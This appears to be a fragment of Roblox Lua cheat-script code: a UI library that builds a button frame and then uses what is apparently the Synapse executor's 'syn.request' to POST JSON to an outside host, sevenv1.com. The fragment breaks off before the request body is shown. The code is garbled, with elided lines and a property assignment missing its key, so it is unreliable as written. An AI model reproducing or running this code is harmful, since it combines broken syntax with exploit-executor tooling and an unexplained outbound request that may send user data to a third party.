...
function library.new(library_title, cfg_location)
    ...
    local Label = library:create("Button", {
        Name = "Main",
        ...
        Size = UDim2.new(0, 700, 0, 500),
         = "http://www.roblox.com/asset/?id=7300333488",
    ...
    local response = syn.request(
        {
            Url = 'https://sevenv1.com', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
